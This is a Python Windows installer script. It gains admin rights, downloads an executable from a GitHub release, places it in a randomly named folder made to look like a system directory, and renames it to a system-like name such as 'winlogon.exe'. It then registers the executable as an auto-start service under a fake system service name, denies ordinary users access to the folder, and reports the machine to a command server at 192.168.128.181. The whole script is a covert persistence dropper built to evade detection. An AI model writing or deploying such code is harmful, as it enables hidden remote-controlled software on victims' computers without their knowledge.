import os
import sys
import ctypes
import socket
import random
import string
import time
import json
import shutil
import tempfile
import zipfile
import requests
import subprocess
import qrcode
from PIL import Image
from urllib.parse import urlparse

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def elevate_privileges():
    """Attempt to re-launch the script with administrator privileges."""
    print("This installer requires administrator privileges.")
    try:
        if sys.executable.endswith("pythonw.exe"):
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, ' '.join(['"' + sys.argv[0] + '"'] + sys.argv[1:]), None, 1
            )
        else:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, ' '.join(['"' + sys.argv[0] + '"'] + sys.argv[1:]), None, 1
            )
    except Exception as e:
        print(f"Failed to elevate privileges: {e}")
    sys.exit(0)

def download_file(url, destination):
    """Download a file from URL to the specified destination."""
    try:
        response = requests.get(url, stream=True, timeout=30)
        response.raise_for_status()
        
        with open(destination, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        return True
    except requests.exceptions.RequestException as e:
        print(f"Download error: {e}")
        return False

def prepare_nssm():
    """Download, extract, and prepare NSSM executable."""
    temp_dir = tempfile.gettempdir()
    nssm_path = os.path.join(temp_dir, "nssm.exe")
    
    # Check if NSSM is already available
    if shutil.which('nssm.exe'):
        return shutil.which('nssm.exe')
    
    if os.path.exists(nssm_path):
        return nssm_path
    
    # Define NSSM download URL
    nssm_url = "https://nssm.cc/release/nssm-2.24.zip"
    nssm_zip = os.path.join(temp_dir, "nssm.zip")
    
    print("Downloading NSSM...")
    if not download_file(nssm_url, nssm_zip):
        print("Failed to download NSSM.")
        return None
    
    # Extract the NSSM zip
    extract_dir = os.path.join(temp_dir, "nssm_extract")
    try:
        with zipfile.ZipFile(nssm_zip, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
    except zipfile.BadZipFile as e:
        print(f"Failed to extract NSSM: {e}")
        return None
    
    # Find the correct NSSM executable based on architecture
    if sys.maxsize > 2**32:  # 64-bit system
        arch_folder = "win64"
    else:
        arch_folder = "win32"
    
    # Walk through extracted files to find nssm.exe
    for root, dirs, files in os.walk(extract_dir):
        if "nssm.exe" in files and arch_folder in root:
            found_nssm = os.path.join(root, "nssm.exe")
            shutil.copy2(found_nssm, nssm_path)
            
            # Clean up extraction
            try:
                os.remove(nssm_zip)
                shutil.rmtree(extract_dir)
            except Exception as e:
                print(f"Warning: Failed to clean up NSSM temporary files: {e}")
            
            return nssm_path
    
    print("Could not find NSSM executable in the extracted files.")
    return None

def select_installation_path():
    """Select a random, obscure installation location."""
    # Choose base directory
    base_options = [
        os.environ.get('ProgramData', 'C:\\ProgramData'),
        os.environ.get('LOCALAPPDATA', os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local'))
    ]
    base_dir = random.choice(base_options)
    
    # First-level folder names that look legitimate
    system_like_folders = [
        'SysData', 'RuntimeBrokerData', 'AppDataCache', 'WindowsUpdate',
        'DiagnosticServices', 'SystemTelemetry', 'PlatformServices',
        'BackgroundTaskHost', 'ServiceManager', 'CrashReporting'
    ]
    first_level = random.choice(system_like_folders)
    
    # Generate random second-level folder name
    chars = string.ascii_letters + string.digits
    second_level = ''.join(random.choice(chars) for _ in range(random.randint(12, 16)))
    
    # Combine to create full path
    install_path = os.path.join(base_dir, first_level, second_level)
    
    try:
        os.makedirs(install_path, exist_ok=True)
        return install_path
    except OSError as e:
        print(f"Failed to create installation directory: {e}")
        return None

def download_and_extract_app(app_url, install_path):
    """Download and extract the application to the installation path."""
    # Use a temporary file for the download
    temp_dir = tempfile.gettempdir()
    download_path = os.path.join(temp_dir, "app_download.zip")
    
    print("Downloading application...")
    if not download_file(app_url, download_path):
        print("Failed to download application.")
        return False
    
    # Extract the application
    try:
        print("Extracting application...")
        with zipfile.ZipFile(download_path, 'r') as zip_ref:
            zip_ref.extractall(install_path)
    except zipfile.BadZipFile as e:
        print(f"Failed to extract application: {e}")
        return False
    finally:
        # Clean up the zip file
        try:
            os.remove(download_path)
        except Exception:
            pass
    
    # Verify expected files exist
    # Note: Placeholder for actual file names - adjust based on application
    main_exe = os.path.join(install_path, "original_app.exe")
    config_file = os.path.join(install_path, "config.json")
    
    if not os.path.exists(main_exe):
        print("Error: Main executable not found after extraction.")
        return False
    
    # Warning if config.json doesn't exist - but don't fail completely
    if not os.path.exists(config_file):
        print("Warning: config.json not found after extraction.")
    
    return True

def rename_executable(install_path):
    """Rename the main executable to a system-like name."""
    # Original executable name
    original_name = "original_app.exe"  # Change based on actual app
    original_path = os.path.join(install_path, original_name)
    
    if not os.path.exists(original_path):
        print(f"Error: Original executable {original_name} not found.")
        return None
    
    # List of system-like executable names
    system_like_names = [
        'svchdlr.exe', 'runtimeexec.exe', 'taskmgrsvc.exe', 'updatesvc.exe',
        'diaghost.exe', 'svcmgr.exe', 'runtimebroker.exe', 'winsyncmgr.exe',
        'syscoretask.exe', 'winlogon.exe', 'backgroundsvc.exe'
    ]
    
    new_name = random.choice(system_like_names)
    new_path = os.path.join(install_path, new_name)
    
    try:
        os.rename(original_path, new_path)
        print(f"Executable renamed to: {new_name}")
        return new_path
    except OSError as e:
        print(f"Failed to rename executable: {e}")
        return None

def generate_unique_id_and_qr():
    """Generate a unique identifier and QR code."""
    # Get computer name
    pc_name = socket.gethostname()
    
    # Generate random string portion
    chars = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(chars) for _ in range(32))
    
    # Combine to create unique ID
    unique_id = f"{pc_name}-{random_string}"
    
    # Generate QR code
    temp_dir = tempfile.gettempdir()
    qr_path = os.path.join(temp_dir, "registration_qr.png")
    
    try:
        img = qrcode.make("BGADWQ:"+unique_id)
        img.save(qr_path)
        
        # Display QR code
        print(f"Your unique installation ID is: {unique_id}")
        
        print(f"Opening QR code - please scan this with the provided application.")
        os.startfile(qr_path)
        
        return unique_id, qr_path
    except Exception as e:
        print(f"Failed to generate or display QR code: {e}")
        return unique_id, None

def wait_for_api_verification(unique_id, api_url, timeout=300):
    """Wait for API verification of the unique ID."""
    print(f"Waiting for verification (timeout: {timeout} seconds)...")
    while True:
            payload = {"Code":unique_id}
            staus_code = requests.post("http://192.168.128.181:8000/addPC",params=payload).status_code
            if staus_code == 200 or staus_code == 204:
                break
    start_time = time.time()
    scan_confirmed = False
    
    while time.time() - start_time < timeout:
        try:
            full_url = f"{api_url}{unique_id}"
            response = requests.get(full_url, timeout=10)
            
            if response.status_code == 200 or response.status_code==204:
                scan_confirmed = True
                break
            
            print("Waiting for verification... Please scan the QR code.")
            time.sleep(15)
            
        except requests.exceptions.RequestException as e:
            print(f"API connection error: {e}")
            time.sleep(15)
    
    return scan_confirmed

def update_config_file(install_path,api_url, unique_id):
    """Update the application's config.json file with the unique ID."""
    config_path = os.path.join(install_path, "config.json")
    
    if not os.path.exists(config_path):
        print("Warning: config.json not found. Creating new configuration.")
        config_data = {}
    else:
        try:
            with open(config_path, 'r') as file:
                config_data = json.load(file)
        except (json.JSONDecodeError, IOError) as e:
            print(f"Error reading config file: {e}")
            config_data = {}
    
    # Update the Token value
    if not isinstance(config_data, dict):
        config_data = {}
    
    config_data['Token'] = unique_id
    config_data['Host'] = api_url
    
    try:
        with open(config_path, 'w') as file:
            json.dump(config_data, file, indent=2)
        print("Configuration file updated successfully.")
        return True
    except IOError as e:
        print(f"Failed to update configuration file: {e}")
        return False

def install_windows_service(nssm_path, exe_path, install_path):
    """Install and start the application as a Windows service using NSSM."""
    # Select a random service name
    service_names = [
        'ClockTimeSync', 'CrashHandlerSvc', 'UserProfileLoader',
        'SystemTelemetryService', 'DiagnosticManagerSvc', 'PlatformUpdateSvc',
        'RuntimeBrokerService', 'BackgroundTaskManager', 'AppUpdateHandler'
    ]
    service_name = random.choice(service_names)
    
    # Generic service description
    descriptions = [
        "Manages system runtime environment and handles background tasks",
        "Provides core system services and background processing",
        "Manages user experience optimization services",
        "Handles critical background system operations",
        "Provides support for application data synchronization"
    ]
    service_desc = random.choice(descriptions)
    
    try:
        # Install service
        print(f"Installing service '{service_name}'...")
        subprocess.run([nssm_path, 'install', service_name, exe_path], 
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Đặt thư mục làm việc của service thành install_path
        subprocess.run([nssm_path, 'set', service_name, 'AppDirectory', install_path], 
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # (Tùy chọn) Cấu hình ghi log để dễ kiểm tra lỗi
        log_dir = os.path.join(install_path, "logs")
        os.makedirs(log_dir, exist_ok=True)
        stdout_log = os.path.join(log_dir, "stdout.log")
        stderr_log = os.path.join(log_dir, "stderr.log")
        subprocess.run([nssm_path, 'set', service_name, 'AppStdout', stdout_log], 
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        subprocess.run([nssm_path, 'set', service_name, 'AppStderr', stderr_log], 
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Configure service to start automatically
        subprocess.run([nssm_path, 'set', service_name, 'Start', 'SERVICE_AUTO_START'],
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Set service description
        subprocess.run([nssm_path, 'set', service_name, 'Description', service_desc],
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Start the service
        print("Starting service...")
        subprocess.run(['sc', 'start', service_name], 
                       check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Verify service is running
        result = subprocess.run(['sc', 'query', service_name], 
                               capture_output=True, text=True)
        
        if "RUNNING" in result.stdout:
            print("Service successfully installed and started.")
            return service_name
        else:
            print("Warning: Service installed but may not be running.")
            return service_name
        
    except subprocess.CalledProcessError as e:
        print(f"Failed to install or start service: {e}")
        try:
            # Try to remove the failed service
            subprocess.run([nssm_path, 'remove', service_name, 'confirm'], 
                           check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except Exception:
            pass
        return None
def restrict_directory_permissions(install_path):
    """Restrict access to the installation directory."""
    try:
        # Grant full control to Administrators
        subprocess.run(['icacls', install_path, '/grant', 'Administrators:(OI)(CI)F', '/T'], 
                      check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Grant full control to SYSTEM
        subprocess.run(['icacls', install_path, '/grant', 'SYSTEM:(OI)(CI)F', '/T'], 
                      check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Remove access for regular users (using SID for language independence)
        subprocess.run(['icacls', install_path, '/remove:g', '*S-1-5-32-545', '/T', '/C'], 
                      check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Stronger: Deny specific permissions to regular users
        subprocess.run(['icacls', install_path, '/deny', '*S-1-5-32-545:(OI)(CI)(RX,W,D)', '/T', '/C'], 
                      check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Disable inheritance from parent directories
        subprocess.run(['icacls', install_path, '/inheritance:d'], 
                      check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        print("Directory permissions secured.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Warning: Failed to fully secure directory permissions: {e}")
        return False

def cleanup(nssm_path, qr_path):
    """Clean up temporary files."""
    try:
        # Only delete NSSM if we downloaded it to temp dir
        if nssm_path and os.path.dirname(nssm_path) == tempfile.gettempdir():
            try:
                os.remove(nssm_path)
            except Exception:
                pass
        
        # Remove QR code image
        if qr_path and os.path.exists(qr_path):
            try:
                os.remove(qr_path)
            except Exception:
                pass
                
    except Exception as e:
        print(f"Warning: Some temporary files could not be cleaned up: {e}")

def main():
    """Main installer function."""
    print("Starting installation...")
    
    # Check for admin privileges
    if not is_admin():
        print("Administrator privileges required.")
        elevate_privileges()
        return
    
    print("Administrator privileges confirmed.")
    
    # Prepare NSSM
    nssm_path = prepare_nssm()
    if not nssm_path:
        print("Failed to prepare NSSM. Exiting.")
        sys.exit(1)
    
    # Select installation path
    install_path = select_installation_path()
    if not install_path:
        print("Failed to create installation directory. Exiting.")
        sys.exit(1)
    
    print(f"Installing to: {install_path}")
    
    # Download and extract application
    # Note: Replace with actual application URL
    app_url = "https://github.com/1234coco/ConnardPC-Application-Bin/releases/download/1.0.1/original_app.zip"
    if not download_and_extract_app(app_url, install_path):
        print("Failed to install application. Cleaning up...")
        shutil.rmtree(install_path, ignore_errors=True)
        sys.exit(1)
    
    # Rename executable
    exe_path = rename_executable(install_path)
    if not exe_path:
        print("Failed to prepare executable. Cleaning up...")
        shutil.rmtree(install_path, ignore_errors=True)
        sys.exit(1)
    
    # Generate unique ID and QR code
    unique_id, qr_path = generate_unique_id_and_qr()
    
    # Wait for API verification
    # Note: Replace with actual API URL
    api_url = "http://192.168.128.181:8000?code="
    if not wait_for_api_verification(unique_id, api_url):
        print("Verification timed out. Cleaning up...")
        shutil.rmtree(install_path, ignore_errors=True)
        cleanup(nssm_path, qr_path)
        sys.exit(1)
    api_url = "http://192.168.128.181:8000/"
    # Update configuration file
    update_config_file(install_path,api_url, unique_id)
    
    # Install Windows service
    service_name = install_windows_service(nssm_path, exe_path, install_path)
    if not service_name:
        print("Failed to install service. Cleaning up...")
        input()
        shutil.rmtree(install_path, ignore_errors=True)
        cleanup(nssm_path, qr_path)
        input()
        sys.exit(1)
    
    # Restrict directory permissions
    restrict_directory_permissions(install_path)
    
    # Final cleanup
    cleanup(nssm_path, qr_path)
    
    print("\nInstallation completed successfully!")
    print(f"Service '{service_name}' is now running.")
    print(f"Unique ID: {unique_id}")
    
    # Sleep for 5 seconds so user can read the final message
    input()
    time.sleep(5)

if __name__ == "__main__":
    main()